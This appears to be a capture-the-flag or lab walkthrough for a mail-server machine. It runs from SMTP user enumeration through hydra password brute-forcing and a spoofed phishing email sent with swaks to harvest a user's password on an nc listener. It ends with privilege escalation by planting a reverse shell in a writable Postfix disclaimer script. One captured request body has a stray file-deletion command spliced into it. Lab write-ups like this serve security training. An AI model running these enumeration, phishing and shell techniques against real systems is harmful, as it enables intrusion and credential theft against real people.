nmap shows 22, 80 and a bunch of mail ports
seems to be a mail server

port 25 - 
Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection| linux/remote/34896.py

port 143, 993, 995 - 
Dovecot with Exim - 'sender_address' Remote Command Execution| linux/remote/25297.txt

HINT TAKEN - we need to cewl a wordlist from users.html, and generate usernames from names, and use smtp_user_enum to find which ones are valid. then try brute-forcing password with name=pass, and send a phishing mail to rest of them. The payload is just to send a web_req to our port 80, where we'll have nc listening. this should give their password, for some reason

```zsh
#type the names of 4 people on the webpage
python username_generator.py -w users.txt > usernames.txt

#test for generated usernames
smtp-user-enum -M VRFY -U usernames.txt -t 192.168.233.137
192.168.233.137: claire.madison exists
192.168.233.137: mike.ross exists
192.168.233.137: brian.moore exists
192.168.233.137: sarah.lorem exists

#test for some default usernames
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 192.168.233.137
192.168.233.137: man exists
192.168.233.137: hr exists
192.168.233.137: irc exists
192.168.233.137: bin exists
192.168.233.137: mail exists
192.168.233.137: sales exists
192.168.233.137: sys exists
192.168.233.137: root exists

#bruteforce name=password for smtp
hydra -L rech.txt -P rech.txt imap://postfish.off/PLAIN -I -t 50
#[143][imap] host: postfish.off   login: sales   password: sales
#we get a hit on sales:sales
```

```zsh
#login and check for any mails
telnet postfish.off 110
USER SALES
ok
PASS sales
ok
STAT
ok
RETR 1
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off

From: it@postfish.off

Hi Sales team,
We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
Regards,
IT
```
So now, we can send a mail to someone in sales team, and get them to click the link
```zsh
sudo swaks -t brian.moore@postfish.off --from it@postfish.off --server postfish.off --port 25 --body "Use this link to reset the password http://192.168.45.249/" --header "Subject: Password Reset Link"

nc -lvnp 80
POST / HTTP/1.1
Host: 192.168.45.249
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
```
We finally have creds for brian:EternaLSunshinE

ssh brian.moore@postfish.off
couldnt initially find anything helpful
so we su sales:sales
again, nothing much

```zsh
cat /etc/group | grep brian
#filter:x:997:brian.moore

#so we see what files this group has access to
find / -group filter 2>/dev/null
/etc/postfix/disclaimer
/var/spool/filter

#ls -la on both, and we find we have full permission on disclaimer file
```
How the postfix/disclaimer works is, it appends some data whenever the pre-assigned users send out a mail
Now, if we edit the postfix to give us a shell, and send them a mail, we should be able to get a shell

So, we edit the disclaimer file with a reverse shell, and send the same swaks mail
```zsh
sudo swaks -t brian.moore@postfish.off --from it@postfish.off --server postfish.off --port 25 --body "Use this link to reset the password http://192.168.45.249/" --header "Subject: Password Reset Link"
```
it doesnt matter what is in that mail, we get shell as filter!

---
sudo -l shows we can run /usr/bin/mail as filter
gtfo root!

What an absolute shitshow!